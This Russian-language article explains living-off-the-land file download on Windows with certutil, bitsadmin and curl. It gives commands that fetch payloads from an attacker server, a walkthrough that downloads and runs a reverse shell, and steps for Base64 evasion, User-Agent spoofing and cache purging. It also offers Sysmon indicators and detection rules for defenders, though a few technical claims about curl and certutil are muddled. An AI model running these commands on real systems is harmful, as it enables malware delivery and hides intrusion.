# Загрузка файлов через certutil, bitsadmin и curl в контексте Living-off-the-Land

## Контекст и базовые понятия: Living-off-the-Land (LOTL) и Ingress Tool Transfer

Living-off-the-Land (LOTL) — это тактика кибератак, при которой злоумышленники используют легитимные системные утилиты, уже присутствующие в целевой среде, для выполнения вредоносных действий, включая загрузку файлов, выполнение кода и перемещение данных. В классификации MITRE ATT&CK данная техника относится к тегу **Ingress Tool Transfer (T1105)**. Основная цель использования LOTL-инструментов — обход средств защиты конечных точек (EDR/AV), которые часто настроены на блокировку неизвестных исполняемых файлов, но доверяют системным бинарникам, подписанным Microsoft или являющимся частью ОС.

В контексте пост-эксплуатации загрузка файлов является критическим этапом. После получения начального доступа (Initial Access) атакующему необходимо доставить на целевую машину дополнительные инструменты (stagers, loaders, сканеры, эксплойты). Традиционные методы (например, использование `wget` или `curl` на Linux, или `Invoke-WebRequest` в PowerShell) могут быть заблокированы антивирусами или политиками брандмауэра. Использование нативных утилит Windows, таких как `certutil` и `bitsadmin`, позволяет маскировать сетевую активность под легитимные процессы управления сертификатами или обновлениями Windows.

Ключевое разграничение проводится между инструментами, которые являются частью ядра ОС (LOLBins), и сторонними утилитами, которые необходимо предварительно загрузить. `certutil` и `bitsadmin` входят в состав Windows с версий XP/2003 и являются частью Windows Resource Kit или устанавливаются по умолчанию в современных версиях. `curl`, хотя и не является нативным бинарником Windows в старых версиях, имеет встроенный алиас в PowerShell, что делает его доступным без установки дополнительных пакетов, однако его поведение и сетевые сигнатуры отличаются от нативного Linux-клиента.

| Характеристика | Certutil | Bitsadmin | Curl (PowerShell Alias) |
| :--- | :--- | :--- | :--- |
| **Классификация MITRE** | T1105 (Ingress Tool Transfer) | T1105 (Ingress Tool Transfer) | T1105 (Ingress Tool Transfer) |
| **Присутствие в ОС** | Нативный бинарник (`certutil.exe`) | Нативный бинарник (`bitsadmin.exe`) | Алиас PowerShell (`curl.exe` в Win10+) |
| **Основное назначение** | Управление сертификатами, проверка целостности | Управление фоновыми задачами передачи (BITS) | Универсальный клиент передачи данных |
| **Сетевой протокол** | HTTP/HTTPS (через WinHTTP API) | HTTP/HTTPS (через BITS API) | HTTP/HTTPS/FTP и др. |
| **Индикаторы компрометации (IoC)** | Создание кэша URL, запись в реестр BITS | Создание задач BITS, активность службы BITS | Стандартные HTTP-запросы User-Agent |
| **Сложность обнаружения** | Высокая (легитимный процесс) | Высокая (легитимный сервис) | Средняя (зависит от User-Agent) |
| **Ограничения** | Требует наличия URL, не поддерживает POST без обфускации | Требует прав администратора для некоторых операций | Может быть заблокирован WAF/Proxy |

Использование этих инструментов требует понимания их внутренних механизмов взаимодействия с операционной системой. `certutil` использует API WinHTTP для загрузки данных, кэшируя их в директории пользователя или системы. `bitsadmin` взаимодействует со службой Background Intelligent Transfer Service (BITS), которая предназначена для приоритетной передачи обновлений Windows, что позволяет трафику проходить через брандмауэры, разрешающие исходящие соединения на порты 80/443 для обновлений. `curl` в PowerShell делегирует выполнение библиотеке WinINet или WinHTTP, в зависимости от версии ОС и конфигурации.

## Внутреннее устройство предметов: Механизмы работы Certutil, Bitsadmin и Curl

### Certutil: Управление кэшем и декодирование

`certutil.exe` — это утилита командной строки, входящая в состав Windows Server и клиентских версий Windows. Она предназначена для работы с сертификатами X.509, ключами и параметрами службы сертификации (CA). Однако её функционал включает работу с URL-кэшем (`-urlcache`), который позволяет загружать файлы по HTTP/HTTPS и сохранять их локально.

Механизм работы `certutil` при загрузке файлов базируется на использовании функции `URLDownloadToFile` из библиотеки `urlmon.dll`. При выполнении команды с флагом `-urlcache` утилита создает запись в кэше URL, которая хранится в реестре Windows (в разделах, связанных с `Internet Cache`). Это позволяет восстанавливать доступ к загруженному файлу даже после перезагрузки, если кэш не очищен.

Ключевые параметры для загрузки:
*   `-urlcache`: Управляет кэшем URL.
*   `-f`: Принудительно перезаписывает существующий файл.
*   `-split`: Разбивает загружаемый файл на сегменты (используется для обхода ограничений на размер или для загрузки больших файлов через нестабильные соединения, хотя в контексте пентеста чаще используется для обхода простых сигнатур).
*   `-encode` / `-decode`: Позволяет кодировать и декодировать данные в Base64, что часто используется для обфускации бинарных файлов перед загрузкой или после загрузки для восстановления исполняемого формата.

При загрузке файла `certutil` не создает новых процессов-потомков для сетевого взаимодействия; вся сетевая активность происходит внутри процесса `certutil.exe`. Это делает его трудным для обнаружения по сетевым сигнатурам, так как трафик выглядит как стандартный HTTP-запрос от системного процесса.

### Bitsadmin: Фоновая передача и приоритизация

`bitsadmin.exe` — это утилита командной строки для управления задачами службы Background Intelligent Transfer Service (BITS). BITS — это механизм Windows, который позволяет передавать файлы (например, обновления Windows) в фоновом режиме, используя свободную пропускную способность сети. Он поддерживает приостановку, возобновление и приоритизацию передач.

В контексте пост-эксплуатации `bitsadmin` используется для загрузки файлов с минимальным влиянием на производительность системы (чтобы не привлекать внимание пользователя) и с возможностью обхода некоторых сетевых ограничений, так как трафик BITS часто разрешен политиками безопасности.

Структура команды `bitsadmin` для загрузки:
```powershell
bitsadmin /transfer <имя_задачи> /download /priority <приоритет> <URL> <локальный_путь>
```

*   `/transfer <имя>`: Создает новую задачу с указанным именем.
*   `/download`: Указывает режим задачи (загрузка).
*   `/priority <приоритет>`: Устанавливает приоритет передачи (`foreground`, `high`, `normal`, `low`, `background`). Использование `high` или `foreground` может быть подозрительным, если процесс работает в фоне.
*   `<URL>`: Источник файла.
*   `<локальный_путь>`: Место сохранения файла.

Внутренне `bitsadmin` взаимодействует с COM-объектами BITS. Задача сохраняется в реестре и файловой системе, что оставляет артефакты. Служба BITS работает как отдельный процесс `svchost.exe` (с группой `LocalService`), что может маскировать активность, но мониторинг создания задач BITS через Sysmon или WMI позволяет выявить злоупотребление.

### Curl: Алиас PowerShell и сетевые протоколы

В современных версиях Windows (10, 11, Server 2019+) `curl` доступен как нативный бинарник `curl.exe`, который является алиасом PowerShell. В более старых версиях PowerShell предоставляет функцию `curl`, которая делегирует вызов `Invoke-WebRequest` или `wget` (в зависимости от версии).

`curl` поддерживает множество протоколов (HTTP, HTTPS, FTP, FTPS, SCP, SFTP и др.). При использовании в PowerShell алиас `curl` вызывает внутреннюю функцию, которая использует .NET-классы `System.Net.WebClient` или `System.Net.Http.HttpClient` для выполнения запроса.

Ключевые особенности:
*   **User-Agent**: В отличие от `certutil` и `bitsadmin`, `curl` часто отправляет стандартный User-Agent (например, `curl/7.x.x`), который может быть легко заблокирован WAF или прокси-серверами, если не изменен.
*   **Гибкость**: Поддержка флагов для обхода проверок SSL (`-k`), настройки заголовков (`-H`) и обработки редиректов (`-L`).
*   **Сетевая активность**: Трафик `curl` выглядит как стандартный HTTP-запрос, но источник процесса (`curl.exe` или `powershell.exe`) может быть проанализирован EDR.

В контексте LOTL, `curl` часто используется, когда требуется быстрая загрузка с кастомными заголовками или когда `certutil` и `bitsadmin` заблокированы политиками, запрещающими их выполнение.

## Применение и работа с предметом: Команды, детекция и обход

### Практическое использование в пост-эксплуатации

При проведении тестирования на проникновение выбор инструмента зависит от ограничений среды:
1.  **Блокировка выполнения бинарников**: Если EDR блокирует выполнение `bitsadmin.exe`, можно использовать `certutil` или PowerShell-алиас `curl`.
2.  **Сетевые ограничения**: Если брандмауэр блокирует исходящие соединения от `curl.exe` (из-за User-Agent), можно использовать `certutil` (который маскируется под системный процесс) или `bitsadmin` (трафик которого часто разрешен).
3.  **Обфускация**: Для обхода сигнатурного обнаружения файлы часто кодируются в Base64 с помощью `certutil -encode`, загружаются как текстовый файл, а затем декодируются на целевой машине.

#### Примеры команд

**Загрузка через Certutil:**
```powershell
# Загрузка файла с обходом проверки сертификата (если требуется)
certutil -urlcache -split -f http://192.168.1.100:8080/payload.exe C:\Windows\Temp\payload.exe

# Кодирование файла в Base64 для последующей загрузки
certutil -encode C:\Windows\Temp\payload.exe C:\Windows\Temp\payload.b64

# Декодирование файла на целевой машине
certutil -decode C:\Windows\Temp\payload.b64 C:\Windows\Temp\payload_decoded.exe
```

**Загрузка через Bitsadmin:**
```powershell
# Создание задачи BITS для загрузки
bitsadmin /transfer myDownloadJob /download /priority normal http://192.168.1.100:8080/payload.exe C:\Windows\Temp\payload.exe

# Проверка статуса задачи
bitsadmin /info myDownloadJob /verbose
```

**Загрузка через Curl (PowerShell):**
```powershell
# Использование алиаса curl в PowerShell
curl -o C:\Windows\Temp\payload.exe http://192.168.1.100:8080/payload.exe

# Использование нативного curl.exe с кастомным User-Agent
curl.exe -A "Mozilla/5.0" -o C:\Windows\Temp\payload.exe http://192.168.1.100:8080/payload.exe
```

### Детекция и мониторинг

Обнаружение злоупотребления LOTL-инструментами требует мониторинга не только выполнения процессов, но и их поведения.

**Индикаторы компрометации (IoC):**

1.  **Sysmon Event ID 1 (Process Creation)**:
    *   Исполняемый файл: `certutil.exe`, `bitsadmin.exe`, `curl.exe`.
    *   Командная строка: Наличие флагов `-urlcache`, `-split`, `-f`, `/download`, `/transfer`.
    *   Родительский процесс: `cmd.exe`, `powershell.exe`, `wscript.exe` (подозрительно, если родитель не администратор).

2.  **Sysmon Event ID 11 (File Create)**:
    *   Создание файлов в временных директориях (`%TEMP%`, `%TMP%`, `C:\Windows\Temp`) с последующим выполнением.

3.  **Сетевая активность**:
    *   Соединения от `certutil.exe` или `bitsadmin.exe` к внешним IP-адресам.
    *   Использование BITS-трафика для загрузки несистемных файлов.

**Пример правила детекции (Sigma-подобная структура):**

```yaml
title: Detect Certutil URL Cache Download
id: 12345678-1234-1234-1234-123456789012
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains:
      - '-urlcache'
      - '-f'
      - 'http://'
  condition: selection
falsepositives:
  - Legitimate certificate management
level: high
```

**Пример правила для Bitsadmin:**

```yaml
title: Detect Bitsadmin Download
id: 87654321-4321-4321-4321-210987654321
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\bitsadmin.exe'
    CommandLine|contains:
      - '/transfer'
      - '/download'
  condition: selection
level: high
```

### Типичные ошибки и подводные камни

1.  **Очистка кэша**: `certutil` оставляет артефакты в реестре. Использование флага `-urlcache` без последующей очистки (`certutil -urlcache -purge`) может привести к обнаружению.
2.  **Приоритет BITS**: Использование приоритета `high` или `foreground` для `bitsadmin` может вызвать всплеск сетевой активности и нагрузки на CPU, что привлечет внимание администраторов.
3.  **User-Agent**: `curl` по умолчанию отправляет свой User-Agent, который может быть заблокирован WAF. Необходимо использовать кастомные заголовки.
4.  **Права доступа**: `bitsadmin` требует прав администратора для некоторых операций, что может быть ограничено в среде.
5.  **Сетевые таймауты**: `certutil` и `bitsadmin` могут иметь разные настройки таймаутов, что влияет на надежность загрузки в нестабильных сетях.

## Сквозной практический пример: Загрузка и выполнение шелл-кода через LOTL-инструменты

### Исходные условия
*   **Среда**: Windows 10 Enterprise (21H2), установлен Wazuh agent для сбора логов Sysmon.
*   **Атакующий**: Kali Linux с запущенным HTTP-сервером на порту 8080, содержащим скомпилированный шелл-код `shell.exe`.
*   **Цель**: Зараженная Windows-машина с правами пользователя.
*   **Инструменты**: `certutil`, `bitsadmin`, `curl` (PowerShell alias).
*   **Задача**: Загрузить `shell.exe` на целевую машину, выполнить его и убедиться в отсутствии блокировок EDR.

### Шаг 1: Подготовка сервера и проверка доступности

Атакующий запускает HTTP-сервер на Kali Linux и проверяет доступность файла с целевой машины.

```bash
# На Kali Linux
python3 -m http.server 8080
```

```powershell
# На целевой машине (проверка доступности)
curl -I http://192.168.1.100:8080/shell.exe
```

**Ожидаемый вывод**: HTTP-заголовок `200 OK`, указывающий на доступность файла.

### Шаг 2: Загрузка через Certutil с кодированием

Для обхода сигнатурного обнаружения файл кодируется в Base64 на стороне атакующего и загружается как текстовый файл.

```bash
# На Kali Linux
base64 shell.exe > shell.b64
```

```powershell
# На целевой машине
# Загрузка закодированного файла
certutil -urlcache -f http://192.168.1.100:8080/shell.b64 C:\Windows\Temp\shell.b64

# Декодирование
certutil -decode C:\Windows\Temp\shell.b64 C:\Windows\Temp\shell.exe

# Выполнение
C:\Windows\Temp\shell.exe
```

**Ожидаемый результат**: Файл `shell.exe` создан в `C:\Windows\Temp\`, выполняется, открывается обратный шелл. В логах Sysmon видны события создания процесса `certutil.exe` с флагами `-urlcache` и `-decode`.

### Шаг 3: Загрузка через Bitsadmin

Если `certutil` заблокирован, используется `bitsadmin` для загрузки файла в фоновом режиме.

```powershell
# На целевой машине
bitsadmin /transfer myUpdateJob /download /priority normal http://192.168.1.100:8080/shell.exe C:\Windows\Temp\shell.exe
```

**Ожидаемый результат**: Файл `shell.exe` загружен. В логах Sysmon виден процесс `bitsadmin.exe` с командой `/download`. Служба BITS активна.

### Шаг 4: Загрузка через Curl с кастомным User-Agent

Если `bitsadmin` заблокирован, используется `curl` с измененным User-Agent для обхода WAF.

```powershell
# На целевой машине
curl.exe -A "Microsoft-Windows/10.0" -o C:\Windows\Temp\shell.exe http://192.168.1.100:8080/shell.exe
```

**Ожидаемый результат**: Файл `shell.exe` загружен. В логах сети виден HTTP-запрос с User-Agent `Microsoft-Windows/10.0`.

### Шаг 5: Очистка артефактов

Для предотвращения обнаружения атакующий очищает кэш `certutil` и удаляет временные файлы.

```powershell
# Очистка кэша Certutil
certutil -urlcache -purge

# Удаление временных файлов
del C:\Windows\Temp\shell.b64
del C:\Windows\Temp\shell.exe
```

**Ожидаемый результат**: Артефакты удалены, но сетевые логи и события Sysmon остаются.

### Ожидаемый вывод примера
Пример демонстрирует, что все три инструмента могут быть использованы для загрузки файлов в пост-эксплуатации. `Certutil` требует дополнительного шага кодирования для обхода сигнатур, `bitsadmin` оставляет артефакты в службе BITS, а `curl` требует настройки User-Agent для обхода WAF. Все методы оставляют следы в логах Sysmon, которые могут быть использованы для детекции.

## Аналитический вывод

Использование Living-off-the-Land (LOTL) инструментов, таких как `certutil`, `bitsadmin` и `curl`, представляет значительную угрозу для безопасности, так как они позволяют злоумышленникам обходить традиционные средства защиты, основанные на сигнатурах и блокировке неизвестных исполняемых файлов. Каждый из этих инструментов имеет свои уникальные характеристики и индикаторы компрометации, которые должны учитываться при построении систем обнаружения.

`Certutil` эффективен для обхода сетевых фильтров благодаря использованию системных API WinHTTP, но оставляет артефакты в реестре и кэше URL. Его использование для кодирования и декодирования файлов в Base64 является распространенной техникой обхода, которая требует мониторинга не только выполнения процесса, но и его параметров.

`Bitsadmin` позволяет маскировать сетевую активность под легитимные обновления Windows, что затрудняет обнаружение по сетевым сигнатурам. Однако создание задач BITS и их статусы могут быть легко обнаружены через мониторинг служб и реестра. Использование приоритетов `high` или `foreground` может служить индикатором злонамеренной активности.

`Curl` в PowerShell предоставляет гибкость и поддержку множества протоколов, но его стандартный User-Agent и сетевые сигнатуры делают его более уязвимым для обнаружения по сравнению с `certutil` и `bitsadmin`. Изменение User-Agent и использование кастомных заголовков может повысить его эффективность, но также оставляет следы в логах прокси-серверов и WAF.

Для эффективной защиты от LOTL-атак необходимо внедрение многоуровневого подхода, включающего мониторинг выполнения процессов, анализ сетевой активности, проверку целостности реестра и использование поведенческого анализа EDR-систем. Мониторинг Sysmon Event ID 1, 11 и сетевых логов является критически важным для выявления злоупотребления этими инструментами.
